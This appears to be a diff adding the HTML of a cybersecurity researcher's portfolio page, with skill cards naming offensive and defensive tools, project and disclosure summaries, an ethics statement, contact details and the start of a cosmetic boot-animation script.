+        <div style="font-family:var(--mono);font-size:.65rem;color:var(--c2);letter-spacing:2px;margin-bottom:1rem;">INDEPENDENT SECURITY RESEARCHER</div>
+      </div>
+      <div class="contact-row">
+        <div class="contact-item"><span class="icon">✉</span><a href="mailto:marcusbenard30@gmail.com">marcusbenard30@gmail.com</a></div>
+        <div class="contact-item"><span class="icon">📞</span>+254 759 995 138</div>
+        <div class="contact-item"><span class="icon">📍</span>Nairobi, Kenya</div>
+        <div class="contact-item"><span class="icon">💼</span><a href="https://linkedin.com/in/marcus-benard" target="_blank">linkedin.com/in/marcus-benard</a></div>
+        <div class="contact-item"><span class="icon">🐙</span><a href="https://github.com/marcusbenard" target="_blank">github.com/marcusbenard</a></div>
+      </div>
+      <div style="margin-top:1.5rem;padding-top:1rem;border-top:1px solid var(--border);">
+        <div style="font-family:var(--mono);font-size:.6rem;color:var(--dim);margin-bottom:.6rem;">SECURITY POSTURE</div>
+        <div class="skill-bar" style="margin-bottom:.3rem;"><div class="skill-fill" data-w="92" style="background:linear-gradient(90deg,var(--c4),var(--c3));"></div></div>
+        <div style="display:flex;justify-content:space-between;font-family:var(--mono);font-size:.55rem;color:var(--dim);margin-bottom:.8rem;"><span>Offensive</span><span>92%</span></div>
+        <div class="skill-bar" style="margin-bottom:.3rem;"><div class="skill-fill" data-w="88" style="background:linear-gradient(90deg,var(--c1),var(--c2));"></div></div>
+        <div style="display:flex;justify-content:space-between;font-family:var(--mono);font-size:.55rem;color:var(--dim);"><span>Defensive</span><span>88%</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- SKILLS -->
+<section id="skills" class="section">
+  <div class="s-header reveal">
+    <span class="s-tag">// 02_COMPETENCIES</span>
+    <h2 class="s-title">Technical <span>Arsenal</span></h2>
+    <div class="s-line"></div>
+  </div>
+  <div class="skills-tabs reveal">
+    <button class="tab-btn active" onclick="switchTab('recon')">Reconnaissance</button>
+    <button class="tab-btn" onclick="switchTab('web')">Web AppSec</button>
+    <button class="tab-btn" onclick="switchTab('network')">Network/System</button>
+    <button class="tab-btn" onclick="switchTab('mobile')">Mobile/Hardware</button>
+    <button class="tab-btn" onclick="switchTab('forensics')">Forensics</button>
+    <button class="tab-btn" onclick="switchTab('siem')">SIEM/SOAR/XDR</button>
+    <button class="tab-btn" onclick="switchTab('code')">Programming</button>
+    <button class="tab-btn" onclick="switchTab('os')">Platforms/OS</button>
+  </div>
+  <div id="tab-recon" class="skill-panel active">
+    <div class="skill-grid">
+      <div class="skill-card"><div class="skill-name">OSINT Framework</div><div class="skill-desc">Advanced open-source intelligence gathering using structured methodologies and layered data correlation techniques.</div><div class="skill-bar"><div class="skill-fill" data-w="90"></div></div><div class="skill-level">Expert — 90%</div></div>
+      <div class="skill-card"><div class="skill-name">Google Dorking</div><div class="skill-desc">Expert-level search operator techniques for vulnerability discovery and sensitive information gathering at scale.</div><div class="skill-bar"><div class="skill-fill" data-w="95"></div></div><div class="skill-level">Expert — 95%</div></div>
+      <div class="skill-card"><div class="skill-name">Shodan Intelligence</div><div class="skill-desc">Proficient IoT and network device reconnaissance for security assessment, exposing misconfigured services.</div><div class="skill-bar"><div class="skill-fill" data-w="88"></div></div><div class="skill-level">Advanced — 88%</div></div>
+      <div class="skill-card"><div class="skill-name">Exploit-DB / GHDB</div><div class="skill-desc">Utilizing Google Hacking Database for vulnerability pattern recognition and target fingerprinting.</div><div class="skill-bar"><div class="skill-fill" data-w="85"></div></div><div class="skill-level">Advanced — 85%</div></div>
+      <div class="skill-card"><div class="skill-name">Nmap / Masscan</div><div class="skill-desc">Comprehensive network mapping, OS detection, service enumeration, and scripted vulnerability checks.</div><div class="skill-bar"><div class="skill-fill" data-w="92"></div></div><div class="skill-level">Expert — 92%</div></div>
+      <div class="skill-card"><div class="skill-name">WhatWeb / Recon-ng</div><div class="skill-desc">Technology fingerprinting, CMS identification, and automated reconnaissance framework workflows.</div><div class="skill-bar"><div class="skill-fill" data-w="80"></div></div><div class="skill-level">Advanced — 80%</div></div>
+    </div>
+  </div>
+  <div id="tab-web" class="skill-panel">
+    <div class="skill-grid">
+      <div class="skill-card"><div class="skill-name">Burp Suite Pro</div><div class="skill-desc">Advanced web vulnerability scanning, manual testing, intercept proxy, and custom extension development.</div><div class="skill-bar"><div class="skill-fill" data-w="93"></div></div><div class="skill-level">Expert — 93%</div></div>
+      <div class="skill-card"><div class="skill-name">SQL Injection</div><div class="skill-desc">Expert testing using SQLmap with manual verification — union-based, error-based, blind time-based techniques.</div><div class="skill-bar"><div class="skill-fill" data-w="91"></div></div><div class="skill-level">Expert — 91%</div></div>
+      <div class="skill-card"><div class="skill-name">XSS / CSRF</div><div class="skill-desc">Identification and exploitation of client-side vulnerabilities — stored, reflected, DOM-based vectors.</div><div class="skill-bar"><div class="skill-fill" data-w="87"></div></div><div class="skill-level">Advanced — 87%</div></div>
+      <div class="skill-card"><div class="skill-name">OWASP Top 10</div><div class="skill-desc">Thorough systematic testing for all OWASP categories — injection, auth bypass, IDOR, SSRF, and more.</div><div class="skill-bar"><div class="skill-fill" data-w="94"></div></div><div class="skill-level">Expert — 94%</div></div>
+      <div class="skill-card"><div class="skill-name">Nikto / Dirb</div><div class="skill-desc">Web server assessment, directory bruteforcing, and header security analysis with custom scan profiles.</div><div class="skill-bar"><div class="skill-fill" data-w="85"></div></div><div class="skill-level">Advanced — 85%</div></div>
+      <div class="skill-card"><div class="skill-name">Auth Bypass</div><div class="skill-desc">Authentication bypass testing — JWT flaws, session fixation, broken access control identification.</div><div class="skill-bar"><div class="skill-fill" data-w="88"></div></div><div class="skill-level">Advanced — 88%</div></div>
+    </div>
+  </div>
+  <div id="tab-network" class="skill-panel">
+    <div class="skill-grid">
+      <div class="skill-card"><div class="skill-name">Metasploit Framework</div><div class="skill-desc">Vulnerability exploitation, payload delivery, post-exploitation, pivoting, and Meterpreter operations.</div><div class="skill-bar"><div class="skill-fill" data-w="90"></div></div><div class="skill-level">Expert — 90%</div></div>
+      <div class="skill-card"><div class="skill-name">Hydra / Medusa</div><div class="skill-desc">Credential brute-forcing against SSH, FTP, HTTP, RDP, and other authentication services.</div><div class="skill-bar"><div class="skill-fill" data-w="88"></div></div><div class="skill-level">Advanced — 88%</div></div>
+      <div class="skill-card"><div class="skill-name">Custom Exploit Dev</div><div class="skill-desc">Python-based proof-of-concept exploit creation for identified vulnerabilities with responsible disclosure.</div><div class="skill-bar"><div class="skill-fill" data-w="82"></div></div><div class="skill-level">Advanced — 82%</div></div>
+      <div class="skill-card"><div class="skill-name">TCP/IP Protocol Analysis</div><div class="skill-desc">Deep packet analysis, protocol dissection, traffic anomaly detection using Wireshark and tcpdump.</div><div class="skill-bar"><div class="skill-fill" data-w="86"></div></div><div class="skill-level">Advanced — 86%</div></div>
+      <div class="skill-card"><div class="skill-name">SSH Security</div><div class="skill-desc">Protocol analysis, configuration auditing, key management vulnerabilities, and tunnel abuse detection.</div><div class="skill-bar"><div class="skill-fill" data-w="84"></div></div><div class="skill-level">Advanced — 84%</div></div>
+      <div class="skill-card"><div class="skill-name">Active Directory</div><div class="skill-desc">AD enumeration, privilege escalation paths, Kerberoasting, Pass-the-Hash attack simulation.</div><div class="skill-bar"><div class="skill-fill" data-w="78"></div></div><div class="skill-level">Proficient — 78%</div></div>
+    </div>
+  </div>
+  <div id="tab-mobile" class="skill-panel">
+    <div class="skill-grid">
+      <div class="skill-card"><div class="skill-name">Android Security</div><div class="skill-desc">ADB exploitation, APK reverse engineering with apktool/jadx, dynamic analysis, and Frida hooking.</div><div class="skill-bar"><div class="skill-fill" data-w="83"></div></div><div class="skill-level">Advanced — 83%</div></div>
+      <div class="skill-card"><div class="skill-name">APK Reverse Engineering</div><div class="skill-desc">Decompiling Android apps, identifying hardcoded credentials, insecure data storage, and API endpoint leaks.</div><div class="skill-bar"><div class="skill-fill" data-w="80"></div></div><div class="skill-level">Advanced — 80%</div></div>
+      <div class="skill-card"><div class="skill-name">Hardware Analysis</div><div class="skill-desc">Embedded system security, UART/JTAG debugging, firmware extraction, and physical access testing.</div><div class="skill-bar"><div class="skill-fill" data-w="72"></div></div><div class="skill-level">Proficient — 72%</div></div>
+      <div class="skill-card"><div class="skill-name">Mobile Forensics</div><div class="skill-desc">Data extraction and analysis from mobile devices, deleted file recovery, and artifact analysis.</div><div class="skill-bar"><div class="skill-fill" data-w="78"></div></div><div class="skill-level">Proficient — 78%</div></div>
+    </div>
+  </div>
+  <div id="tab-forensics" class="skill-panel">
+    <div class="skill-grid">
+      <div class="skill-card"><div class="skill-name">Data Recovery</div><div class="skill-desc">TestDisk and PhotoRec for partition recovery, file carving, and data restoration from damaged media.</div><div class="skill-bar"><div class="skill-fill" data-w="85"></div></div><div class="skill-level">Advanced — 85%</div></div>
+      <div class="skill-card"><div class="skill-name">Evidence Preservation</div><div class="skill-desc">Chain of custody documentation, forensic imaging with dd/FTK, hash verification and integrity checks.</div><div class="skill-bar"><div class="skill-fill" data-w="82"></div></div><div class="skill-level">Advanced — 82%</div></div>
+      <div class="skill-card"><div class="skill-name">Log Analysis</div><div class="skill-desc">Timeline reconstruction, root cause determination, event correlation across multiple log sources.</div><div class="skill-bar"><div class="skill-fill" data-w="88"></div></div><div class="skill-level">Advanced — 88%</div></div>
+      <div class="skill-card"><div class="skill-name">Incident Response</div><div class="skill-desc">PTES and NIST IR framework adherence — identification, containment, eradication, and recovery.</div><div class="skill-bar"><div class="skill-fill" data-w="84"></div></div><div class="skill-level">Advanced — 84%</div></div>
+    </div>
+  </div>
+  <div id="tab-siem" class="skill-panel">
+    <div class="skill-grid">
+      <div class="skill-card"><div class="skill-name">Wazuh SIEM/XDR</div><div class="skill-desc">Rule writing, log aggregation, threat correlation, real-time alerting, and compliance monitoring.</div><div class="skill-bar"><div class="skill-fill" data-w="91"></div></div><div class="skill-level">Expert — 91%</div></div>
+      <div class="skill-card"><div class="skill-name">Zeek (formerly Bro)</div><div class="skill-desc">Network security monitoring, protocol decoding, custom scripts for anomaly detection and threat hunting.</div><div class="skill-bar"><div class="skill-fill" data-w="85"></div></div><div class="skill-level">Advanced — 85%</div></div>
+      <div class="skill-card"><div class="skill-name">n8n SOAR Automation</div><div class="skill-desc">Custom playbook development, cross-platform alert enrichment, automated remediation workflows.</div><div class="skill-bar"><div class="skill-fill" data-w="88"></div></div><div class="skill-level">Advanced — 88%</div></div>
+      <div class="skill-card"><div class="skill-name">T-Pot Honeypots</div><div class="skill-desc">Deception network setup, attacker behavior analysis, threat intelligence feed generation.</div><div class="skill-bar"><div class="skill-fill" data-w="82"></div></div><div class="skill-level">Advanced — 82%</div></div>
+      <div class="skill-card"><div class="skill-name">ELK Stack</div><div class="skill-desc">Elasticsearch indexing, Logstash pipelines, Kibana dashboards, and custom visualization creation.</div><div class="skill-bar"><div class="skill-fill" data-w="86"></div></div><div class="skill-level">Advanced — 86%</div></div>
+      <div class="skill-card"><div class="skill-name">OPSEC / Tor / Tails</div><div class="skill-desc">Operational security, anonymous research via Tor network, privacy-preserving Tails OS deployments.</div><div class="skill-bar"><div class="skill-fill" data-w="89"></div></div><div class="skill-level">Advanced — 89%</div></div>
+    </div>
+  </div>
+  <div id="tab-code" class="skill-panel">
+    <div class="skill-grid">
+      <div class="skill-card"><div class="skill-name">Python 3</div><div class="skill-desc">Security tool development, automation scripts, custom exploit creation, and n8n API integrations.</div><div class="skill-bar"><div class="skill-fill" data-w="90"></div></div><div class="skill-level">Expert — 90%</div></div>
+      <div class="skill-card"><div class="skill-name">Bash Scripting</div><div class="skill-desc">System automation, toolchain integration, workflow optimization, and SIEM log preprocessing pipelines.</div><div class="skill-bar"><div class="skill-fill" data-w="87"></div></div><div class="skill-level">Advanced — 87%</div></div>
+    </div>
+  </div>
+  <div id="tab-os" class="skill-panel">
+    <div class="skill-grid">
+      <div class="skill-card"><div class="skill-name">Kali / Parrot / Tails</div><div class="skill-desc">Primary security distributions — fully configured with custom toolchains, aliases, and automation scripts.</div><div class="skill-bar"><div class="skill-fill" data-w="95"></div></div><div class="skill-level">Expert — 95%</div></div>
+      <div class="skill-card"><div class="skill-name">Ubuntu / Debian / Fedora</div><div class="skill-desc">Server administration, service hardening, firewall management, and security baseline configuration.</div><div class="skill-bar"><div class="skill-fill" data-w="90"></div></div><div class="skill-level">Expert — 90%</div></div>
+      <div class="skill-card"><div class="skill-name">Windows Server / AD</div><div class="skill-desc">Active Directory security policy implementation, GPO management, and Windows event log analysis.</div><div class="skill-bar"><div class="skill-fill" data-w="80"></div></div><div class="skill-level">Advanced — 80%</div></div>
+      <div class="skill-card"><div class="skill-name">Wazuh / Zeek / n8n / ELK</div><div class="skill-desc">Specialized security platforms — deployment, configuration, integration, and operational management.</div><div class="skill-bar"><div class="skill-fill" data-w="88"></div></div><div class="skill-level">Advanced — 88%</div></div>
+    </div>
+  </div>
+</section>
+
+<!-- SIMULATIONS -->
+<section id="simulations" class="section">
+  <div class="s-header reveal">
+    <span class="s-tag">// 03_LIVE_DEMOS</span>
+    <h2 class="s-title">Interactive <span>Simulations</span></h2>
+    <div class="s-line"></div>
+    <p style="margin-top:1rem;color:var(--text);font-size:.95rem;max-width:600px;">Realistic simulations of real security tools and techniques. Click any simulation to launch an interactive demonstration.</p>
+  </div>
+  <div class="sim-grid reveal">
+    <!-- Nmap -->
+    <div class="sim-card" onclick="openSim('nmap')">
+      <div class="sim-card-header"><span class="sim-card-title">⟩ NMAP Network Scanner</span><span class="sim-tag recon">RECON</span></div>
+      <div class="sim-preview" id="prev-nmap"><canvas id="nmap-preview-canvas" style="width:100%;height:100%;"></canvas></div>
+      <button class="sim-launch">▶ LAUNCH NMAP SIMULATION</button>
+    </div>
+    <!-- SOC Dashboard -->
+    <div class="sim-card" onclick="openSim('soc')">
+      <div class="sim-card-header"><span class="sim-card-title">⟩ SOC Dashboard (Wazuh)</span><span class="sim-tag defensive">DEFENSIVE</span></div>
+      <div class="sim-preview" id="prev-soc"><canvas id="soc-preview-canvas" style="width:100%;height:100%;"></canvas></div>
+      <button class="sim-launch">▶ LAUNCH SOC SIMULATION</button>
+    </div>
+    <!-- Burp Suite -->
+    <div class="sim-card" onclick="openSim('burp')">
+      <div class="sim-card-header"><span class="sim-card-title">⟩ Burp Suite Intercept</span><span class="sim-tag offensive">OFFENSIVE</span></div>
+      <div class="sim-preview" id="prev-burp"><canvas id="burp-preview-canvas" style="width:100%;height:100%;"></canvas></div>
+      <button class="sim-launch">▶ LAUNCH BURP SIMULATION</button>
+    </div>
+    <!-- Secure Comms -->
+    <div class="sim-card" onclick="openSim('tor')">
+      <div class="sim-card-header"><span class="sim-card-title">⟩ Secure Comms / Tor OPSEC</span><span class="sim-tag defensive">OPSEC</span></div>
+      <div class="sim-preview" id="prev-tor"><canvas id="tor-preview-canvas" style="width:100%;height:100%;"></canvas></div>
+      <button class="sim-launch">▶ LAUNCH OPSEC SIMULATION</button>
+    </div>
+    <!-- OSINT -->
+    <div class="sim-card" onclick="openSim('osint')">
+      <div class="sim-card-header"><span class="sim-card-title">⟩ OSINT Framework</span><span class="sim-tag recon">RECON</span></div>
+      <div class="sim-preview" id="prev-osint"><canvas id="osint-preview-canvas" style="width:100%;height:100%;"></canvas></div>
+      <button class="sim-launch">▶ LAUNCH OSINT SIMULATION</button>
+    </div>
+    <!-- Forensics -->
+    <div class="sim-card" onclick="openSim('forensics')">
+      <div class="sim-card-header"><span class="sim-card-title">⟩ Digital Forensics Lab</span><span class="sim-tag forensics">FORENSICS</span></div>
+      <div class="sim-preview" id="prev-forensics"><canvas id="forensics-preview-canvas" style="width:100%;height:100%;"></canvas></div>
+      <button class="sim-launch">▶ LAUNCH FORENSICS SIMULATION</button>
+    </div>
+  </div>
+</section>
+
+<!-- PROJECTS -->
+<section id="projects" class="section">
+  <div class="s-header reveal">
+    <span class="s-tag">// 04_KEY_PROJECTS</span>
+    <h2 class="s-title">Notable <span>Projects</span></h2>
+    <div class="s-line"></div>
+  </div>
+  <div class="proj-grid reveal">
+    <div class="proj-card soc">
+      <div class="proj-icon">🏢</div>
+      <div class="proj-title">Enterprise-Grade Homelab SOC</div>
+      <div class="proj-desc">Fully integrated Security Operations Center combining Wazuh (SIEM/XDR) for log aggregation and threat detection, Zeek for network protocol analysis, and n8n for SOAR automation — creating an automated threat detection and response pipeline with real-time alert correlation.</div>
+      <div class="proj-tags">
+        <span class="proj-tag">Wazuh</span><span class="proj-tag">ELK Stack</span><span class="proj-tag">Zeek</span><span class="proj-tag">n8n SOAR</span><span class="proj-tag">T-Pot</span><span class="proj-tag">Threat Intelligence</span>
+      </div>
+    </div>
+    <div class="proj-card comms">
+      <div class="proj-icon">🔒</div>
+      <div class="proj-title">Secure Communications Framework</div>
+      <div class="proj-desc">Privacy-preserving research framework leveraging Tor network architecture for anonymity and operational security (OPSEC). Integrated Tails OS with encrypted communication protocols for sensitive research activities and data integrity assurance.</div>
+      <div class="proj-tags">
+        <span class="proj-tag">Tor Network</span><span class="proj-tag">Tails OS</span><span class="proj-tag">OPSEC</span><span class="proj-tag">E2E Encryption</span><span class="proj-tag">Anonymity</span>
+      </div>
+    </div>
+    <div class="proj-card vuln">
+      <div class="proj-icon">🎯</div>
+      <div class="proj-title">Responsible Disclosure Program</div>
+      <div class="proj-desc">Systematic vulnerability assessment program targeting major Kenyan institutions. Identified critical injection flaws and authentication bypass issues in JKUAT's student information systems and security flaws in Airtel Kenya's telecom infrastructure. Full coordinated disclosure executed.</div>
+      <div class="proj-tags">
+        <span class="proj-tag">JKUAT</span><span class="proj-tag">Airtel Kenya</span><span class="proj-tag">SQLi</span><span class="proj-tag">Auth Bypass</span><span class="proj-tag">Responsible Disclosure</span>
+      </div>
+    </div>
+    <div class="proj-card ml">
+      <div class="proj-icon">🤖</div>
+      <div class="proj-title">ML-Enhanced Threat Detection</div>
+      <div class="proj-desc">Ongoing research applying machine learning models to cybersecurity detection — anomaly detection algorithms fed with real attacker behavior data captured from T-Pot honeypot deployments. Exploring behavioral analysis for zero-day threat identification.</div>
+      <div class="proj-tags">
+        <span class="proj-tag">Machine Learning</span><span class="proj-tag">Anomaly Detection</span><span class="proj-tag">Behavioral Analysis</span><span class="proj-tag">Python</span><span class="proj-tag">In Progress</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ACHIEVEMENTS -->
+<section id="achievements" class="section">
+  <div class="s-header reveal">
+    <span class="s-tag">// 05_VALIDATED_DISCOVERIES</span>
+    <h2 class="s-title">Security <span>Intelligence</span></h2>
+    <div class="s-line"></div>
+  </div>
+  <div class="ach-grid reveal">
+    <div class="ach-card">
+      <div class="ach-badge gold">🎓</div>
+      <div class="ach-org">JKUAT</div>
+      <div class="ach-title">Critical Vuln Discovery</div>
+      <div class="ach-body">Identified critical web application vulnerabilities in JKUAT's student information systems. Coordinated responsible disclosure resulting in formal acknowledgment from university IT security. Addressed injection flaws and authentication bypass issues.</div>
+    </div>
+    <div class="ach-card">
+      <div class="ach-badge gold">📡</div>
+      <div class="ach-org">Airtel Kenya</div>
+      <div class="ach-title">Telecom Infrastructure</div>
+      <div class="ach-body">Discovered security flaws in telecommunications infrastructure with potential impact on customer data. Executed coordinated disclosure through established security channels. Findings contributed to enhanced security measures for critical national infrastructure.</div>
+    </div>
+    <div class="ach-card">
+      <div class="ach-badge silver">⚙️</div>
+      <div class="ach-org">Homelab SOC</div>
+      <div class="ach-title">Full SOC Deployment</div>
+      <div class="ach-body">Architected and deployed a fully operational homelab Security Operations Center integrating SIEM, XDR, network monitoring, SOAR automation, and honeypot deception — mirroring enterprise-grade security capabilities on self-managed infrastructure.</div>
+    </div>
+  </div>
+  <!-- Methodology -->
+  <div style="margin-top:3rem;" class="reveal">
+    <div style="font-family:var(--mono);font-size:.65rem;color:var(--c2);letter-spacing:3px;margin-bottom:1.5rem;">// METHODOLOGY FRAMEWORKS</div>
+    <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:1rem;">
+      <div style="background:var(--panel);border:1px solid var(--border);padding:1rem;text-align:center;">
+        <div style="font-family:var(--title);font-size:.8rem;color:var(--c1);margin-bottom:.3rem;">PTES</div>
+        <div style="font-family:var(--mono);font-size:.6rem;color:var(--dim);">Penetration Testing Execution Standard</div>
+      </div>
+      <div style="background:var(--panel);border:1px solid var(--border);padding:1rem;text-align:center;">
+        <div style="font-family:var(--title);font-size:.8rem;color:var(--c1);margin-bottom:.3rem;">OWASP</div>
+        <div style="font-family:var(--mono);font-size:.6rem;color:var(--dim);">Testing Guide v4.2</div>
+      </div>
+      <div style="background:var(--panel);border:1px solid var(--border);padding:1rem;text-align:center;">
+        <div style="font-family:var(--title);font-size:.8rem;color:var(--c1);margin-bottom:.3rem;">NIST CSF</div>
+        <div style="font-family:var(--mono);font-size:.6rem;color:var(--dim);">Cybersecurity Framework</div>
+      </div>
+      <div style="background:var(--panel);border:1px solid var(--border);padding:1rem;text-align:center;">
+        <div style="font-family:var(--title);font-size:.8rem;color:var(--c1);margin-bottom:.3rem;">D3SEC</div>
+        <div style="font-family:var(--mono);font-size:.6rem;color:var(--dim);">Defense-in-Depth Architecture</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- CERTIFICATIONS -->
+<section id="certifications" class="section">
+  <div class="s-header reveal">
+    <span class="s-tag">// 06_CERTIFICATIONS</span>
+    <h2 class="s-title">Training &amp; <span>Credentials</span></h2>
+    <div class="s-line"></div>
+  </div>
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:4rem;" class="reveal">
+    <div class="timeline">
+      <div class="tl-item">
+        <div class="tl-dot active"></div>
+        <div class="tl-date">2024 — IN PROGRESS</div>
+        <div class="tl-title">OSCP — Offensive Security Certified Professional</div>
+        <div class="tl-body">Pursuing the gold standard in penetration testing certification. Intensive 24-hour practical exam requiring exploitation of multiple machines in isolated network environments.</div>
+        <span class="tl-status pursuing">● PURSUING</span>
+      </div>
+      <div class="tl-item">
+        <div class="tl-dot active"></div>
+        <div class="tl-date">2023 — ONGOING</div>
+        <div class="tl-title">Wazuh SIEM/XDR Specialization</div>
+        <div class="tl-body">Continuous training on Wazuh platform — rule development, log analysis, threat correlation, and XDR deployment architecture.</div>
+        <span class="tl-status completed">✓ ACTIVE</span>
+      </div>
+      <div class="tl-item">
+        <div class="tl-dot"></div>
+        <div class="tl-date">2023 — COMPLETED</div>
+        <div class="tl-title">Network Security Monitoring (Zeek)</div>
+        <div class="tl-body">Deep-dive training in Zeek network analysis scripting, protocol logging, and integration with SIEM platforms for enhanced detection.</div>
+        <span class="tl-status completed">✓ COMPLETED</span>
+      </div>
+      <div class="tl-item">
+        <div class="tl-dot"></div>
+        <div class="tl-date">2022 — COMPLETED</div>
+        <div class="tl-title">Security Fundamentals — Self-Directed</div>
+        <div class="tl-body">Structured self-study through TryHackMe, HackTheBox, and PortSwigger Academy platforms combined with practical lab environments.</div>
+        <span class="tl-status completed">✓ COMPLETED</span>
+      </div>
+    </div>
+    <div>
+      <div style="font-family:var(--mono);font-size:.65rem;color:var(--c2);letter-spacing:3px;margin-bottom:1.5rem;">// SPECIALIZED SKILLS</div>
+      <div style="display:flex;flex-direction:column;gap:.8rem;">
+        <div style="background:var(--panel);border:1px solid var(--border);padding:1rem;">
+          <div style="font-family:var(--mono);font-size:.65rem;color:var(--c1);margin-bottom:.5rem;">HARDWARE HACKING</div>
+          <div class="skill-bar"><div class="skill-fill" data-w="72"></div></div>
+        </div>
+        <div style="background:var(--panel);border:1px solid var(--border);padding:1rem;">
+          <div style="font-family:var(--mono);font-size:.65rem;color:var(--c1);margin-bottom:.5rem;">REVERSE ENGINEERING</div>
+          <div class="skill-bar"><div class="skill-fill" data-w="78"></div></div>
+        </div>
+        <div style="background:var(--panel);border:1px solid var(--border);padding:1rem;">
+          <div style="font-family:var(--mono);font-size:.65rem;color:var(--c1);margin-bottom:.5rem;">SIEM/SOAR ARCHITECTURE</div>
+          <div class="skill-bar"><div class="skill-fill" data-w="91"></div></div>
+        </div>
+        <div style="background:var(--panel);border:1px solid var(--border);padding:1rem;">
+          <div style="font-family:var(--mono);font-size:.65rem;color:var(--c1);margin-bottom:.5rem;">n8n AUTOMATION WORKFLOWS</div>
+          <div class="skill-bar"><div class="skill-fill" data-w="88"></div></div>
+        </div>
+        <div style="background:var(--panel);border:1px solid var(--border);padding:1rem;">
+          <div style="font-family:var(--mono);font-size:.65rem;color:var(--c1);margin-bottom:.5rem;">CTF CHALLENGES</div>
+          <div class="skill-bar"><div class="skill-fill" data-w="85"></div></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ETHICS -->
+<section id="ethics" class="section">
+  <div class="s-header reveal">
+    <span class="s-tag">// 07_ETHICS</span>
+    <h2 class="s-title">Ethical <span>Framework</span></h2>
+    <div class="s-line"></div>
+  </div>
+  <div class="ethics-grid reveal">
+    <div class="eth-card"><div class="eth-icon">⚖️</div><div class="eth-title">Legal Compliance</div><div class="eth-text">Strict observance of all applicable laws and regulations. All testing conducted within legal boundaries and jurisdictional frameworks.</div></div>
+    <div class="eth-card"><div class="eth-icon">📋</div><div class="eth-title">Written Authorization</div><div class="eth-text">Testing only performed on systems with explicit written permission. Zero unauthorized access — ever.</div></div>
+    <div class="eth-card"><div class="eth-icon">🔔</div><div class="eth-title">Responsible Disclosure</div><div class="eth-text">Coordinated vulnerability reporting through proper channels. Organizations given adequate remediation time before any publication.</div></div>
+    <div class="eth-card"><div class="eth-icon">🛡</div><div class="eth-title">Data Protection</div><div class="eth-text">Respect for confidentiality and privacy of all information encountered during security assessments.</div></div>
+    <div class="eth-card"><div class="eth-icon">🎖</div><div class="eth-title">Professional Integrity</div><div class="eth-text">Maintaining highest standards of ethical conduct. Reputation built on trust, honesty, and transparent communication.</div></div>
+    <div class="eth-card"><div class="eth-icon">🔐</div><div class="eth-title">OPSEC</div><div class="eth-text">Operational security and privacy preservation in all research activities. Protecting both researcher and client from exposure.</div></div>
+  </div>
+</section>
+
+<!-- CONTACT -->
+<section id="contact" class="section">
+  <div class="s-header reveal">
+    <span class="s-tag">// 08_CONTACT</span>
+    <h2 class="s-title">Get In <span>Touch</span></h2>
+    <div class="s-line"></div>
+  </div>
+  <div class="contact-grid reveal">
+    <div>
+      <p style="font-size:1rem;line-height:1.9;color:var(--text);margin-bottom:1.5rem;">Available for penetration testing engagements, SOC engineering roles, vulnerability research, and security architecture consulting. Open to full-time, contract, and project-based work.</p>
+      <div class="contact-links">
+        <a href="mailto:marcusbenard30@gmail.com" class="c-link"><span class="c-link-icon">✉</span><div><span class="c-link-label">EMAIL</span><span class="c-link-val">marcusbenard30@gmail.com</span></div></a>
+        <a href="tel:+254759995138" class="c-link"><span class="c-link-icon">📞</span><div><span class="c-link-label">PHONE</span><span class="c-link-val">+254 759 995 138</span></div></a>
+        <a href="https://linkedin.com/in/marcus-benard" target="_blank" class="c-link"><span class="c-link-icon">💼</span><div><span class="c-link-label">LINKEDIN</span><span class="c-link-val">linkedin.com/in/marcus-benard</span></div></a>
+        <a href="https://github.com/marcusbenard" target="_blank" class="c-link"><span class="c-link-icon">🐙</span><div><span class="c-link-label">GITHUB</span><span class="c-link-val">github.com/marcusbenard</span></div></a>
+      </div>
+    </div>
+    <div>
+      <div class="avail-box">
+        <div class="avail-title">// AVAILABILITY STATUS</div>
+        <div class="avail-item"><span class="avail-label">Penetration Testing</span><span class="avail-dot"></span></div>
+        <div class="avail-item"><span class="avail-label">SOC Engineering</span><span class="avail-dot"></span></div>
+        <div class="avail-item"><span class="avail-label">Vuln Research</span><span class="avail-dot"></span></div>
+        <div class="avail-item"><span class="avail-label">Full-Time Roles</span><span class="avail-dot"></span></div>
+        <div class="avail-item"><span class="avail-label">Contract / Freelance</span><span class="avail-dot"></span></div>
+        <div class="avail-item"><span class="avail-label">CTF / Research Collab</span><span class="avail-dot partial"></span></div>
+      </div>
+      <div style="background:var(--panel);border:1px solid var(--border);padding:1.5rem;margin-top:1rem;">
+        <div style="font-family:var(--mono);font-size:.65rem;color:var(--c2);letter-spacing:3px;margin-bottom:1rem;">// RESPONSE TIME</div>
+        <div style="font-family:var(--title);font-size:2rem;color:var(--c1);">&lt; 24h</div>
+        <div style="font-family:var(--mono);font-size:.6rem;color:var(--dim);margin-top:.3rem;">GUARANTEED RESPONSE</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+</main>
+
+<footer>
+  <div style="margin-bottom:.5rem;">MARCUS<span>.</span>BENARD // CYBERSECURITY SPECIALIST</div>
+  <div>NAIROBI, KENYA — <span>2023 – PRESENT</span> — ALL ACTIVITIES CONDUCTED ETHICALLY &amp; LEGALLY</div>
+</footer>
+
+<!-- SIMULATION MODAL -->
+<div class="modal-overlay" id="sim-modal" onclick="if(event.target===this)closeSim()">
+  <div class="modal">
+    <div class="modal-header">
+      <span class="modal-title" id="modal-title">SIMULATION</span>
+      <button class="modal-close" onclick="closeSim()">✕</button>
+    </div>
+    <div class="modal-body" id="modal-body"></div>
+  </div>
+</div>
+
+<script>
+// ============================================================
+// BOOT SEQUENCE
+// ============================================================
+const bootLines = [
+  {t:'Initializing secure environment...',c:'',delay:200},
+  {t:'Loading Kali Linux 2024.1 kernel...',c:'ok',delay:300},
+  {t:'Mounting encrypted partitions...',c:'ok',delay:200},
+  {t:'Starting network interfaces (eth0, wlan0)...',c:'ok',delay:250},
+  {t:'Initializing Tor daemon...',c:'ok',delay:350},
+  {t:'Loading Wazuh agent...',c:'ok',delay:200},
+  {t:'Starting Zeek network monitor...',c:'ok',delay:300},
+  {t:'Checking for root privileges...',c:'ok',delay:150},
+  {t:'⚠ Hostile network detected — enabling stealth mode',c:'warn',delay:400},
+  {t:'Loading portfolio assets...',c:'ok',delay:200},
